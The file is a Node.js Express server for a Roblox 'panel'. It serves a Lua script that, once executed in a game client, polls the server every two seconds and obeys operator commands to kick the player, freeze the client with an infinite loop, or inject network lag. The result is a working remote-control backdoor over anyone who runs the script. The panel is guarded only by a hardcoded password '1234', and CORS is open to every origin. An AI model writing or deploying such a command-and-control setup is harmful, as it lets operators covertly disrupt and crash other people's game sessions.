const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

let players = {};
const PANEL_PASSWORD = "1234"; // Пароль для входа в панель

app.post('/api/login', (req, res) => {
    const { password } = req.body;
    if (password === PANEL_PASSWORD) {
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

app.get('/api/get_exec_script', (req, res) => {
    const lua = `
    local username = game:GetService("Players").LocalPlayer.Name
    local serverUrl = _G.ToozeServer or "${req.protocol}://${req.get('host')}"
    task.spawn(function()
        while task.wait(2) do
            local success, result = pcall(function()
                return game:HttpGet(serverUrl .. "/api/ping?username=" .. username)
            end)
            if success and result then
                if result == "kick" then
                    game:GetService("Players").LocalPlayer:Kick("Kicked via Panel")
                    break
                elseif result == "crash" then
                    while true do end
                elseif result == "lag" then
                    settings().Network.IncomingReplicationLag = 1000
                elseif result == "unlag" then
                    settings().Network.IncomingReplicationLag = 0
                end
            end
        end
    end)
    `;
    res.send(lua);
});

app.get('/api/ping', (req, res) => {
    const { username } = req.query;
    if (!username) return res.send("ok");
    if (!players[username]) {
        players[username] = { username, lastSeen: Date.now(), command: "none", lagActive: false };
    } else {
        players[username].lastSeen = Date.now();
    }
    const currentCommand = players[username].command;
    if (currentCommand === "kick" || currentCommand === "crash") {
        delete players[username];
    }
    res.send(currentCommand);
});

app.get('/api/players', (req, res) => {
    const auth = req.headers['authorization'];
    if (auth !== PANEL_PASSWORD) return res.status(403).json([]);
    const now = Date.now();
    Object.keys(players).forEach(name => {
        if (now - players[name].lastSeen > 8000) delete players[name];
    });
    res.json(Object.values(players));
});

app.post('/api/command', (req, res) => {
    const auth = req.headers['authorization'];
    if (auth !== PANEL_PASSWORD) return res.status(403).json({ success: false });
    const { username, command, value } = req.body;
    if (players[username]) {
        if (command === 'lag') {
            players[username].command = value ? 'lag' : 'unlag';
            players[username].lagActive = value;
        } else {
            players[username].command = command;
        }
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
